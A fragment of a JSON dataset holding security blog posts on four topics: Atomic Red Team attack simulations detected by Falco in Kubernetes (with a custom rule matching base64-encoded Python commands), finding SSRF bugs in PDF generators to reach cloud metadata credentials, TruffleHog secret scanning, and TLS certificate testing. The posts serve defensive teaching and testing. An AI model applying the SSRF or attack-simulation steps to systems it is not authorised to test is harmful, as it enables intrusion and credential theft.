        "output": "Title: \"Better Together: Real Time Threat Detection for Kubernetes with Atomic Red Tests & Falco\"\nTaxonomies: \"Blue Team, Blue Team Tools, Guest Author, How-To, Informational, art, cdr, cloud, falco, ids, realtime, tests\"\nCreation Date: \"Thu, 04 Jan 2024 16:00:00 +0000\"\n\n | Nigel Douglas\n\nAs a Developer Advocate working on Project Falco, Nigel Douglas plays a key role in driving education for the Open-Source Detection and Response (D&R) segment of cloud-native security at Sysdig. He spends his time drafting articles, blogs, and taking the stage to help bring awareness to how security needs to change in the cloud.\n\nIn cloud-native environments, where applications scale up and down much faster than traditional monolithic application architectures, the ability to proactively identify and respond to threats in real time is paramount. As more organizations embrace cloud-native architectures for application delivery, more robust security measures need to be introduced. In this blog post, we delve into the dynamic realm of Kubernetes threat detection by exploring how open-source Falco can seamlessly detect Atomic Red Team tests in real time within Kubernetes environments.\n\nAtomic Red Team is a powerful framework designed to simulate real-world attacks, providing organizations with a controlled environment to validate the effectiveness of their security measures. We take this a step further by contributing a single Kubernetes Deployment manifest to speed-up the deployment and testing of Atomic Red tests in Kubernetes clusters via a single command, simulating useful attack scenarios to test the responsiveness of existing, open-source, cloud-native intrusion detection systems such as Falco.\n\nOur journey begins with the effortless deployment of Atomic Red to Kubernetes, showcasing the simplicity and efficiency of orchestrating security testing within containerized environments. Once deployed, we invoke specific Atomic Red Team tests, simulating a range of threat scenarios. The true test lies in Falco's ability to detect these threats in line with the MITRE ATT&CK framework, a globally recognized matrix mapping adversary techniques to defensive tactics.\n\nThis exploration is not just about identifying threats; it's a collaborative effort to enhance security coverage in Kubernetes. Should we identify any gaps in Falco\u2019s detection capabilities, we can dive deeper, revising the executed techniques and crafting custom rules. This iterative process aims to extend MITRE ATT&CK coverage, aligning Atomic Red tests with the industry's best practices for threat detection and mitigation in Kubernetes.\n\n## Deploying Atomic Red Team\n\nTo avoid any potential service disruption in production environments, we recommend installing Atomic Red in a test lab environment, or at least a staging environment of Kubernetes. We have a step-by-step video for installing Atomic Red in Kubernetes: https://www.youtube.com/watch?v=5QjGnHGnxxo\n\nBefore we start the deployment, remember to create the atomic-red network namespace.\n\nkubectl create ns atomic-red\n\nA single pod will be deployed with privileged set to true. Atomic Red requires admin-level securityContext to perform certain actions that require elevated permissions.\n\nkubectl apply -f - <\n\nNote: This creates a pod called 'atomicred' in the 'atomic-red' network namespace.\n\nYou can check on the state of the installation with the below command:\n\nkubectl get pods -n atomic-red\n\nIf you ever want to remove the Atomic Red project from your Kubernetes cluster, simply run:\n\nkubectl delete deployment atomicred -n atomic-red\n\n## Familiarize Yourself with Atomic Red Tests\n\nOnce deployed, you will need to shell into the Atomic Red pod to perform the following test scenarios.\n\nThis might seem a little confusing, but Atomic Red was developed with PowerShell in mind, so the below instructions ask the user to shell into a container, and once they are in the running pod, they must run PowerShell to import and invoke the various Atomic Test scenarios.\n\nOnce you are familiar with this logic, you\u2019ll find Atomic Red is a truly simple security simulation tool.\n\nkubectl exec -it -n atomic-red deploy/atomicred -- bash\n\nAs mentioned, you need to run PowerShell once you are in the Atomic Red pod:\n\npwsh\n\nNow, you can finally load the Atomic Red Team module:\n\nImport-Module \"~/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1\" -Force\n\nCheck the details of the TTPs:\n\nInvoke-AtomicTest T1070.004 -ShowDetails\n\nCheck the prerequisites to ensure the test conditions are right:\n\nInvoke-AtomicTest T1070.004 -GetPreReqs\n\nYou can see in the below screenshot, there are no prerequisites required to perform these tests. As a result, we can invoke the bulk file deletion test scenario.\n\nRemove the feature flags to execute the test simulation.\n\nInvoke-AtomicTest T1070.004\n\nThis test will attempt to delete individual files or individual directories. When we have Falco installed, this Atomic test should trigger the 'Warning bulk data removed from disk' rule by default. Next, we discuss Falco\u2019s installation.\n\nCongrats! Now that we know how Atomic Red works, let\u2019s install Falco and run it side-by-side against Atomic Red to prove it detects these tests in real time. We will need to open two terminal windows to see the real-time response detections.\n\n## Installing & Testing Falco\n\nFor this lab guide, we can install Falco via Helm on a fixed version prior to the segregation of rules into different rules feeds, such as 'incubating', 'sandbox', and 'stable'. The reason we are doing this is to ensure all Falco rules are accessible in our lab scenario. To use the latest version of Falco, simply remove the '--version' feature flag from the Helm install script.\n\nhelm install falco falcosecurity/falco --namespace falco \\\n --create-namespace \\\n --set tty=true \\\n --version 3.3.0\n\nJust like the Atomic Red deployment, we need to monitor the progress of the Falco installation. The pods will change state a few times during the installation but should eventually all be in a 'RUNNING' status after about a minute or so.Please use the below command to check on the status change of Falco pods:\n\nkubectl get pods -n falco -w\n\nOnce Falco is installed, we can track the events as they are generated using the following command in the second terminal window.\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco\n\nJump back into the first terminal window and re-run the bulk file deletion Atomic Test - 'T1070.004':\n\nInvoke-AtomicTest T1070.004\n\nYou\u2019re going to identify certain noise in the detection rules. For example, all Atomic Tests are run under the 'Root' user, therefore, we will always get a detection for scripts running under root. To ignore this noise, let\u2019s instead just check for the specific Falco rule we are looking to detect:\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Bulk data has been removed from disk'\n\nHurrah! We see the exact detection matching the context of the Atomic Red test scenario.\n\nLet\u2019s move on to the next Atomic Test to invoke. There are a bunch of test scenarios for Linux that you can test out today.\n\nCheck out the list on the official [Atomic Red Team Github project](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md).\n\n## T1556.003 Modify Authentication Process\n\nIn this scenario, Atomic Red generates three Pluggable Authentication Modules (PAM): two malicious PAM rules for Linux and FreeBSD, as well as a malicious PAM module for Linux. These programs can be used to open and read sensitive file content, and we can agree that they are non-trusted programs. Again, we have an [out-of-the-box rule](https://thomas.labarussias.fr/falco-rules-explorer/?source=syscalls&hash=5116b3ca0c5fad246cc41ca67938a315) for these activities:\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Sensitive file opened for reading by non-trusted program'\n\nNow, it's time to simulate our threat:\n\nInvoke-AtomicTest T1556.003\n\n## T1036.005 Masquerading: Match Legitimate Name or Location\n\nThis test scenario executes a process from a directory masquerading as the current parent directory.\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Executing binary not part of base'\n\nNow, it's time to simulate our threat.\n\nInvoke-AtomicTest T1036.005\n\nYou can see that in the left terminal window, there is an echo message in the terminal saying '\u201dHello from the Atomic Red Team.\u201d' Any string output in the command line can also be detected in Falco\u2019s outputs.\n\n## T1070.002 Indicator Removal on Host\n\nAdversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the '/var/log/' directory.\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Log files were tampered'\n\nNow, it's time to simulate our threat:\n\nInvoke-AtomicTest T1070.002\n\n## T1070.003 Clear Command History\n\nIn addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminals so that users can retrace what they've done.\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Shell history had been deleted or renamed'\n\nNow, it's time to simulate our threat:\n\nInvoke-AtomicTest T1070.003\n\nYou can see from the below screenshot that four different operations were performed. Therefore, four unique Falco detections were triggered on those individual attempts to clear the command line history.\n\n## T1014 Loadable Kernel Module Based Rootkit\n\nAdversaries may use Rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.\n\nRootkits may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware. As such, it\u2019s critical that Falco detects Rootkits in real time.\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Linux Kernel Module injection from container detected'\n\nNow, it's time to simulate our threat:\n\nInvoke-AtomicTest T1014\n\nFalco is detecting the Linux kernel module injection attempt, whether it was a successful execution or not.\n\n## T1037.004 [CUSTOM RULE] Boot Initialization - RC Scripts\n\nAdversaries may establish persistence by modifying RC scripts that are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nCommand to simulate the 'T1037.004' test:\n\nInvoke-AtomicTest T1037.004\n\nYou\u2019ll notice that this is the first test where we don\u2019t get a useful Falco detection related to the threat. As a result, we need to create a 'custom-rules.yaml' file with the custom Falco rule for detecting boot initialization scripts.\n\ncat > custom-rules.yaml <\n This rule detects base64-encoded Python scripts on command line arguments.\n condition: >\n spawned_process and (\n ((proc.cmdline contains \"python -c\" or proc.cmdline contains \"python3 -c\" or proc.cmdline contains \"python2 -c\") and (proc.cmdline contains \"echo\" or proc.cmdline icontains \"base64\")) or ((proc.cmdline contains \"import\" and proc.cmdline contains \"base64\" and proc.cmdline contains \"decode\")))\n output: >\n Potentially malicious Python script encoded on command line\n (proc.cmdline=%proc.cmdline user.name=%user.name proc.name=%proc.name\n proc.pname=%proc.pname evt.type=%evt.type gparent=%proc.aname[2]\n ggparent=%proc.aname[3] gggparent=%proc.aname[4] evt.res=%evt.res\n container.id=%container.id container.name=%container.name file=%fd.name)\n priority: warning\n tags:\n - T1037.004\n - MITRE_Defense_Evasion\n source: syscall\nEOF\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to 'rc.local', 'rc.common', and other RC scripts specific to the Unix-like distribution. Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nLet\u2019s try upgrading Falco to reflect the 'custom-rules.yaml' file:\n\nhelm upgrade falco falcosecurity/falco \\\n -n falco \\\n --set tty=true \\\n --version 3.3.0 \\\n --reuse-values \\\n -f custom-rules.yaml\n\nGranted there\u2019s no obvious formatting issues when creating the 'custom-rules.yaml' manifest, you should be able to successfully upgrade Falco and the pods should be in a 'RUNNING' state. If there was an issue with the custom rules file, the Falco pod state will likely change to 'CrashLoopBackOff'.\n\nLet\u2019s see if we detect the Atomic test after upgrading Falco with the newly-created custom rule.\n\nRemember to have Falco running in a second terminal window with the following command:\n\nkubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Potentially malicious Python script'\n\nWe can simulate the technique ID 'T1037.004' one last time:\n\nInvoke-AtomicTest T1037.004\n\nHurrah! We detected the boot initialization scripts with the above command. To recap, adversaries looking to abuse those RC scripts are especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems. If you are wondering why the Falco rule was specifically looking at Base64-encoded Python scripts, well, we need to look back at the details associated with the Atomic test simulation.\n\nInvoke-AtomicTest T1037.004 -ShowDetails\n\nWe can see from the command that it is using the 'python3' command to run Python scripts. However, the script itself is executed as a base64-encoded string to evade some traditional detection tools.\n\n## Conclusion\n\nIn conclusion, the adoption of Kubernetes in cloud-native systems has ushered in a new era of efficiency and scalability, but with these advantages comes the pressing need for robust threat detection and response mechanisms. Recognizing this imperative, security teams can leverage the power of Kubernetes deployment manifests to streamline the deployment of security tools, exemplified by the Atomic Red program.\n\nRather than engaging in the laborious task of building the Atomic Red program from scratch or managing its tests through a Docker container, the innovative use of a Kubernetes deployment manifest allows security professionals to execute a single command. This capability enables swift and dynamic scaling of the Atomic Red pod within Kubernetes clusters, providing a responsive and adaptable security solution.\n\nIt is essential to acknowledge that the prevalence of Linux endpoints powering Kubernetes nodes necessitates a focus on Linux-centric atomic tests. While Kubernetes itself is not limited to Linux distributions, this article serves as an introduction to the utilization of the Atomic Red Kubernetes manifest, emphasizing its effectiveness in enhancing security responsiveness within Kubernetes environments.\n\nA special acknowledgement is due to Thomas Labarussias from Project Falco (@ISSIF on Github \u2014 https://github.com/Issif) for his contribution in crafting the image for the deployment manifest. Through collaborative efforts and innovative solutions like the Atomic Red Kubernetes manifest, the security landscape in cloud-native ecosystems takes a significant step forward, reinforcing the resilience and adaptability of organizations in the face of evolving threats.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hunting for SSRF Bugs in PDF Generators\"\nTaxonomies: \"How-To, Sean Verity, Web App\"\nCreation Date: \"Thu, 11 Jan 2024 15:56:52 +0000\"\n\n \n\nIf you\u2019ve been on a website and noticed one of the following features, there\u2019s a good chance you\u2019ve stumbled upon a hot spot for server-side request forgery (SSRF) bugs: \n\nPrint a certificate of completion \n\nGenerate a report \n\nSubmit a digital signature \n\nBefore getting into the nuts \u2018n\u2019 bolts of how to find and exploit SSRF bugs in PDF generators, let\u2019s go through a quick thought experiment. I want to give you a simple mental snapshot of what is going on when a PDF is generated in a web application.\n\nImagine that you saved a very basic web page into an HTML file on your desktop and named it ssrf.html. The web page uses JavaScript to fetch an image and add it to the web page. It looks like this.\n\nThen, imagine opening that HTML file and saving it to a PDF with your web browser\u2019s Print feature.\n\nThe browser parsed HTML, executed JavaScript, and requested a remote image file to generate a PDF. As you can imagine, there could be some serious implications if an attacker can influence the HTML that the PDF is generated from. Here are a few things you could attack with an SSRF bug:\n\nIMDS: If the server is hosted in the cloud (e.g. AWS, Azure, or GCP), there\u2019s a good chance you\u2019ll be able to interact with its instance metadata service (IMDS). If luck is on your side and AWS IMDSv1 is enabled, you\u2019ll probably be able to leak AWS temporary security credentials from the IAM endpoint or plaintext credentials from the user-data endpoint.\n\nPDF Generator: The PDF generating component itself may be vulnerable.\n\nHost / Service Discovery: You will almost certainly be able to interact with other services running on the server or systems that are not publicly accessible.\n\nWhere to Start?\n\nLook at the PDF and take note of any data in it that you provided to the application such as name, address, digital signature, etc. These are good parameters to investigate. During your investigation, there are a few questions you\u2019ll want to answer:\n\nCan I inject HTML?\n\nCan I access remote servers?\n\nCan I execute JavaScript?\n\nIs the server that\u2019s rendering my PDF cloud hosted?\n\nAre there any known vulnerabilities in the component that\u2019s generating the PDF?\n\nWhat other services or systems can I interact with?\n\nAm I giving it enough time?\n\nThis last question is actually a story to highlight a challenge and solution I encountered while hunting an elusive SSRF bug. The lesson might prove useful if you find yourself in a similar situation.\n\nAs you work through testing potential sources, you\u2019ll either get visual cues in the generated PDF, callbacks to an out-of-band server like Burp Collaborator1, or a combination thereof.\n\nIf you\u2019ve ever exploited a cross-site scripting (XSS) vulnerability, the first few questions should be familiar. Exploiting SSRF bugs in PDF generators is very much like exploiting XSS bugs. The big difference is that you don\u2019t have the DOM right in front of you since it\u2019s all happening on the server. The mindset is very similar though.\n\nCan I inject HTML?\n\nThere are three likely contexts where your payload is landing on the server:\n\nIn between HTML tags\n\nWrapped with apostrophes, inside an HTML entity attribute\n\nWrapped with quotation marks, inside an HTML entity attribute\n\nAs alluded to earlier, you probably won\u2019t see what you\u2019re injecting into so you\u2019ll have to do some investigation to determine which context your payload is landing in. Payloads (highlighted) are shown in the code blocks that follow. If a given payload renders, then you know what context your payload is landing in.\n\nA quick note on the last two contexts, where your payload is landing inside of an HTML entity attribute. If you have a Pro license for Burp, an automated scan finding of \u201cExternal HTTP Interaction\u201d is likely indicative of the last two contexts. If you don\u2019t have a Pro license, try pasting a URL to an image into the payload position. If the image appears in the PDF, that\u2019s also a pretty good indication that your payload is landing in one of the last two contexts.\n\nIn between HTML tags\n\nYour payload might be landing in between a couple of HTML tags. In which case, try injecting one or two HTML elements. Using two elements can be handy because if the HTML is rendered, you\u2019ll get a visual cue in the PDF that your HTML was rendered.\n\nCongratulations!\nBig HeaderSmall Header\n\nWrapped with apostrophes, inside an HTML entity attribute\n\nCongratulations!\nBig ApostropheLittle Apostrophe'>\n\nWrapped with quotation marks, inside an HTML entity attribute\n\nCongratulations!\n\"/>Big Quotation MarkLittle Quotation Mark\">\n\nPitfall! Atari 2600, 1982.\n\nWARNING: When checking for the last context, quotation marks, be mindful of your request type. JSON is a very common request format that you\u2019ll come across. Don\u2019t forget to escape the quotation marks!\n\nIt\u2019s important to figure out which context your payload is landing in, because if there\u2019s a syntax error, you might see an error message, or you might not see anything at all.\n\nCan I access remote servers?\n\nAs mentioned before, try pasting a URL into the payload position that you\u2019re investigating. If it fetches the remote resource or interacts with your Bup Collaborator, then you know that the server you're testing can access remote servers.\n\nIf you determined that your payload is landing in between two HTML tags, though, try something like the following: \n\nCongratulations!\n\nI\u2019d also like to highlight a feature that you might not expect to be vulnerable to SSRF. Digital signatures are an unexpected place for SSRF, but keep an eye out for requests that include something like this:\n\ndata:image/png;base64,{{BASE64_ENCODED_BLOB}}\n\nThat\u2019s the start of a data URL2, which is a way that an application can embed images inline as opposed to fetching them from a remote server. Here\u2019s what a vulnerable server is likely expecting:\n\nProof that you Signed Your Life Away\n\"data:image/png;base64,{{BASE64_ENCODED_DIGITAL_SIGNATURE}}\">\n\nSince the data URL is just a source for an image element, try replacing the data URL with a URL that points to a remote resource.\n\nCan I execute JavaScript?\n\nAt this point, you\u2019ve figured out where your payload is landing and verified that the server can pull down remote resources. Next, you could check for JavaScript execution. My go-to method is to use something like this.\n\nProof that you Signed Your Life Away\n\">\t\">\n\nIf you see the BHIS logo3 in the rendered PDF, then you know that the JavaScript executed.\n\nNow, something to keep in mind. As when testing for XSS, there\u2019s a chance that injecting a "
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Rooting For Secrets with TruffleHog\"\nTaxonomies: \"Informational\"\nCreation Date: \"Thu, 18 Jan 2024 16:00:00 +0000\"\n\nThe potential leaking of confidential information can pose a significant security risk for any organization. When sensitive details (i.e., API keys, passwords, cryptographic keys, and other credentials) are unintentionally committed to version control systems like Git, they could lead to a compromise of systems, data, or other resources.\n\nLeaking secrets can have severe repercussions for an organization, compromising data integrity, confidentiality, and system security. Exposed tokens can provide unauthorized access to sensitive information, enabling malicious actors to manipulate or steal data, disrupt services, and potentially escalate their attacks. Additionally, exploited tokens could also be leveraged to conduct sophisticated phishing campaigns or launch further cyberattacks.\n\nThe impact of this lapse in security could manifest as financial losses, reputational damage, and legal consequences.\n\nSo how do you know if you have buried secrets hiding in the vast digital landscape of your organization? Easy. You employ a truffle hog.\n\nTruffleHog\n\nTruffleHog1 is a free security tool designed to root around for sensitive information exposure within version control systems, CI, cloud assets, and file systems. Specifically, it helps identify and mitigate security risks related to the inadvertent storage of credentials, secrets, and other sensitive data.\n\nFor example, TruffleHog could scan a Git code repository for patterns that resemble known sensitive information, helping the organization and developers proactively identify and remove such data before it becomes a security vulnerability.\n\nIdentifying and cleaning up leaked secrets before an attacker can find them is a crucial component to security.\n\nInstallation\n\nInstalling TruffleHog is easy using APT by executing the command below.\n\nsudo apt install trufflehog\n\nAPT not your thing? Don't worry. The tool supports several other methods for installation:\n\nUsing brew on MacOS\n\nDocker\n\nBinary releases via https://github.com/trufflesecurity/trufflehog/releases\n\nGit clone and compile from source\n\nUsing the install.sh script on GitHub (also supports specific version installation\n\nExact steps for these alternative installation methods can be found at https://github.com/trufflesecurity/trufflehog#floppy_disk-installation.\n\nSub-Commands\n\nOnce installed, it's time to familiarize yourself with the nine available \"sub-commands\" that TruffleHog uses to root around for secrets. These can be listed by using the --help flag from the command line as shown below. \n\ntrufflehog --help\n\nTruffleHog Sub-Commands\n\nEach of the commands above has specific subsequent \"flags\" that can be set when executing TruffleHog. These additional flags help to both extend functionality and narrow the tool's scope. These flags can be listed by including the --help flag after any of the above sub-commands as shown below.\n\nOptional Flags (Snippet)\n\nThere are some flags that are available across every sub-command. The --json flag, for example, outputs the tool's results in JSON format. \n\nSample JSON Output\n\nThis could then be consumed and parsed by a custom script to convert any findings into even more actionable intelligence. Given the sample TruffleHog JSON output above, let's say you want to extract information about each detected issue, specifically the commit, file, email, repository, and the detected AWS keys. You can use jq to accomplish this! \n\nThe jq command-line tool is a powerful and lightweight way to process and manipulate JSON data. It provides a convenient and efficient way to extract, transform, and filter JSON content, making it a valuable tool for working with JSON-based APIs, configuration files, and data processing.\n\nSome of jq's useful features are:\n\nQuerying and Selecting Data\n\nFiltering and Transformation\n\nPrettifying Output\n\nConditional Processing\n\nCombining with Other Unix Tools (i.e., cat, grep, sed)\n\nScripting Support\n\nThe command below takes our TruffleHog JSON output and extracts commit, file, email, repository, and the detected AWS keys to display in a shortened JSON format.\n\ncat trufflehog_output.json | jq -c '.SourceMetadata.Data.Git as $git | {commit: $git.commit, file: $git.file, email: $git.email, repository: $git.repository, awsKey: .Raw}'\n\njq Parsing\n\nAnother shared sub-command flag is --only-verified, which directs TruffleHog to check every potential credential that is detected against the API that it thinks it belongs to. This additional step can help eliminate false positives. For example, the AWS credential detector performs a GetCallerIdentity API call against the AWS API to verify if an AWS credential is active. \n\nSample Verified Key\n\nOther flags are sub-command specific like --since-commit and --max-depth, which are available in the git command and control how far back and to what depth into commits the scan focuses on. These are useful to narrow the scope of the scan and incorporate it into your CI process to identify problems before they reach a distributed repository. \n\nNow that we know what TruffleHog is, why it's important, and understand the basics of how it works, let's look at some real examples.\n\nWeb Application\u2026 err\u2026 Application\n\nTruffleHog has been so successful in reviewing repositories, filesystems, cloud assets, and CI implementations that it has also been adapted (by third parties) into browser extensions (Chrome2 and Firefox3) to scan web application code returned by a server for secrets too!\n\nFor example, the image below shows a React application that graciously returned numerous secrets for a company's CI/CD pipeline within the main.js file. Including GitHub, Bamboo, Polaris, AWS, and SonarQube secrets.\n\nAPI keys for CI/CD pipeline\n\nThis issue is made worse by the file not requiring authentication to get \u2014 meaning anyone online could retrieve these keys. With a little extra legwork, and the help of GitHub's API, an attacker would discover the GitHub token allowed for full read-write to the organization's private GitHub. This could also permit user information for who issued the token, the organization's larger list of users, and repository enumeration.\n\nGitHub Token Authorization Sample\n\n The leaked AWS keys were also valid and could be abused using AWS's own cli tool4.\n\nMy Code Has Secrets. What Now?\n\nBHIS recommends taking the following steps when you encounter secrets in your (or your customer's) code:\n\nRemove all secrets.\n\nRemove the previous commit(s) in the repository's history that contained the secret.\n\nPeriodically run open-source token scanning software such as TruffleHog.\n\nReview the CI/CD configurations.\n\nWhat Next?\n\nIf you're interested in learning more advanced usage of TruffleHog, you can start by checking out their guide on GitHub (https://github.com/trufflesecurity/trufflehog#advanced-usage).\n\nReferences\n\nEnjoyed this blog? Want to learn more?\n\nChris will be presenting live, online training during The Most Offensive Con That Ever Offensived!\n\nFind more details here:\n\nAdvanced Offensive Tooling\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Testing TLS and Certificates\"\nTaxonomies: \"Brian King, InfoSec 201, LLMNR, Web App, encryption, SSL, TLS\"\nCreation Date: \"Thu, 25 Jan 2024 16:00:00 +0000\"\n\nPentest reports sometimes include bad information under a heading like, \"Weak TLS Configuration\" or \"Insecure SSL Certificates.\" This article will explain how TLS is supposed to work, common ways it goes wrong, and a few pitfalls to avoid when testing. \n\nFirst, there are two separate things at play here \u2014 the certificate is one, the cryptography for the TLS connection is another. \n\nYour first thought about certificates and HTTPS may be, \"Oh, that's what keeps my information private. It encrypts the data as it goes across networks so that only the server and I can decrypt it...\" but that's not quite right. The certificate's primary job is to let you verify who you're talking to. \n\nThe encryption only happens after that's done. \n\nIt does little good to encrypt your conversation if you don't know who you are talking to. \n\nWhat a Certificate Does \n\nThe certificate on a TLS server is an X.509 certificate. We sometimes call them \"SSL Certificates\" or \"TLS Certificates.\" There's nothing wrong with that, but it's good to know their actual name, too. \n\nA certificate's purpose is to give a client confidence that the server is who it claims to be before starting a conversation. A certificate for a domain is like a passport for a citizen: it's a thing you get possession of that allows someone to validate your identity based on the assertions of a trusted third party. \n\nWith a passport, that third party is a government. If you have decided to trust a country's passport issuing system and I show you a valid passport from that country with the name \"George Washington\" on it, and if you believe the person in the photo on that passport is me, then your trust in that government's process for issuing passports, and the fact that the passport is not, in your judgement, forged or altered, means that you must believe that's my name.\n\nWith a certificate, the third party is a certificate authority (CA). If a website shows you a valid certificate with its domain name on it and that certificate is signed by a CA you trust, then your trust in that CA means that you must believe that the server is who it claims to be.\n\nWrinkle: It's your browser or web client or OS vendor that decides which CAs to trust. You don't really get to pick.\n\nWhen you test a certificate, you are testing it for validity \u2014 making sure the signature is valid and that the root certificate that signed it is one that you trust. Anyone can make a forged certificate that claims to be valid for any given domain name, just as anyone can make a forged ID card. The value (in both the passport and the certificate) is in the ability to detect a forged or invalid item by verifying the claim with a trusted third party.\n\nDetails: Certificate Validation \n\nBefore issuing a certificate for a given domain, a reputable certificate authority will require the requestor to prove that they control that domain. \n\nThat is the one job of a certificate authority \u2014 their signature on a certificate is their statement that whoever controls the domain named in the certificate also controls the private key for the certificate (and by implication is the only one who can use the certificate to establish a TLS connection). \n\nThe certificate authority is saying this: If you get a certificate signed by us when you visit a server by its fully qualified domain name, and if you verify that the signature on the certificate was created with our root certificate (which is pre-installed with your client) then you can have great confidence that the owner of the domain is in control of the server that the certificate came from. That is, you're talking to who you think you're talking to. \n\nProving control of a domain to a certificate authority is often done by adding a DNS TXT record with content specified by the CA (but the CA can come up with their own requirements). \n\nThe certificate validates ownership of a domain name. \n\nIf you try to validate a certificate when you've connected to its server by IP address, that validation will ALWAYS fail. Certificates validate ownership of domain names. If there's no domain name, there's no claim to confirm.  \n\n(Aside: It is possible to include an IP address in a certificate as a Subject Alternative Name, and then it would validate. But in practice, nobody does this. No server operator wants to be tied to a single IP address. And no client connects to a web server by its IP address anyhow. Except you, of course. You do that sometimes. But you also know how to use curl . And you know what the -k switch does. You're slightly atypical there. Play along.) \n\nQualys SSL Server Test Knows: Don't Test TLS by IP Address (see red text) \n\nGood Trust Rating: Testing by FQDN \n\nSame Site Tested by IP: \"certificate does not match supplied URI\" \n\nIt's common to see a site's certificate signed by one or more \"intermediate\" certificates and not directly by the root certificate. This results in a certificate chain, where each certificate is signed by one higher up on the chain until you get to the root certificate. The server you're talking to should include every certificate in that chain except for the root certificate. It is an error to omit intermediate certificates (but your client often knows where to find them and will do so). It is also an error to include the root certificate, and/but any sane client will just mutter, \"nice try,\" ignore it, and use what's in its local certificate store anyhow. \n\nThis chain approach makes it easier to protect the root certificate's private key by keeping it offline nearly all the time and signing new certificates with an intermediate certificate that is signed by the root instead. This way, if an intermediate certificate is compromised, the CA can revoke it and issue a new one signed by the same root certificate (and not have to immediately distribute a new root certificate to every web client in the world). They can also use different intermediate certificates for different purposes, or cycle through intermediate certificates on a schedule for the same reasons organizations change passwords now and then. \n\nAs in programming, a little indirection adds flexibility. \n\nTrusting a Certificate (or Not) \n\nThere are only two reasons not to trust a certificate: \n\nWhen it is expired or not yet valid based on its own from and to dates, and \n\nWhen the signature on the certificate cannot be independently verified. There are two ways this can happen: \n\nThe certificate is self-signed, so there is no third-party to consult about its validity. \n\nThe certificate is not self-signed, but the signing certificate is neither in the client's trusted certificate store, nor signed by one that is. \n\nA certificate that is self-signed cannot be independently validated. That makes it untrusted by default. Some clients allow a user to \"trust this certificate from this server in the future\" in the same kind of \"trust on first use\" approach that SSH takes, and so they are not always bad. Just nearly always. \n\nAn organization can create its own root signing certificate. That certificate would be installed on all of the organization's devices as a custom certificate, similar to how a tester imports the certificate from Burp Suite or ZAP into the browser they use for testing. The organization could then use this certificate to sign certificates for sites intended to be used only from corporate-owned devices. Corporate devices would be able to validate the signature and connect. Other systems would not be able to validate the signature and will throw an error. \n\nIf you see an \"untrusted certificate\" error, that probably means it's not self-signed (or the error would have said \"self-signed\" instead), but one of the following is true: \n\nThe client you're using doesn't have the signing certificate and so cannot verify the signature. \n\nYou do have the signing certificate, but the signature on the certificate failed validation (i.e. the certificate is forged). \n\nThe certificate is expired or not yet valid. \n\nOddly, perhaps, every root signing certificate we trust is self-signed. But the signing chain has to end somewhere, and these root certificates are widely distributed via controlled methods into secure storage locations. It's from that delivery process that we derive trust in the root certificates. \n\nThis means that if an attacker can get their own self-signed certificate into your client's certificate store as a trusted root certificate, that attacker can make certificates for any domain and your client will trust them. It's important to protect that certificate store. \n\nDetails: Cryptography \n\nThe certificate has almost nothing to do with the encryption used in the TLS conversation. It facilitates the sharing of key material between the client and the server, but it has nothing to say about which algorithms, key exchange methods, or key lengths may be used. The certificate's primary job is to allow you to confirm that you're talking to who you think you're talking to. \n\nTLS uses the asymmetric keys (a public key and a private key) associated with the certificate to exchange a unique symmetric key for each TLS connection. That symmetric key is what is used to encrypt the data sent over the TLS connection. Once you've established that the server is who it claims to be, only then are you able to keep your data private by encrypting it with a key known only to you and the server. \n\nThe network traffic looks something like this: \n\nClient sends a \"client hello\" message to start the connection. This includes random bytes called \"client random\" for later use, along with the version of TLS it wants to use and a list of cipher suites it supports. \n\nServer responds with a \"server hello\" that includes the server certificate (and sometimes an intermediate certificate or two), the cipher suite the server chose from the list the client gave, and a string of random bytes called \"server random\" for later use. \n\nClient verifies the signature on the server certificate, using a root certificate it already has in its store of trusted certificates. If this fails, the connection stops. \n\nClient uses the public key in the certificate it got from the server to encrypt another string of random bytes called the \"premaster secret\" and sends the ciphertext to the server. Server uses private key to decrypt those random bytes. \n\nClient and server separately generate the same session key based on the \"client random,\" the \"server random,\" and the \"premaster secret.\" \n\nSession key is used to encrypt all future data in this connection. \n\nKey Takeaways\n\nThat was a lot of words to explain why we focus on just a few things when testing TLS certificates. Those things are: \n\nTesting a server's TLS configuration by using its IP address will ALWAYS result in trust failures, and probably other misinformation too. \n\nSelf-signed certificates cannot be independently validated or trusted. \n\nA certificate that you cannot validate is not necessarily one that cannot be validated. Corporate certificate authorities are real and need to be taken into account. \n\nThe encryption algorithms supported by a server are not determined by the certificate the server uses. \n\n"
    },
    {
        "input": "",
        "instruction": "",
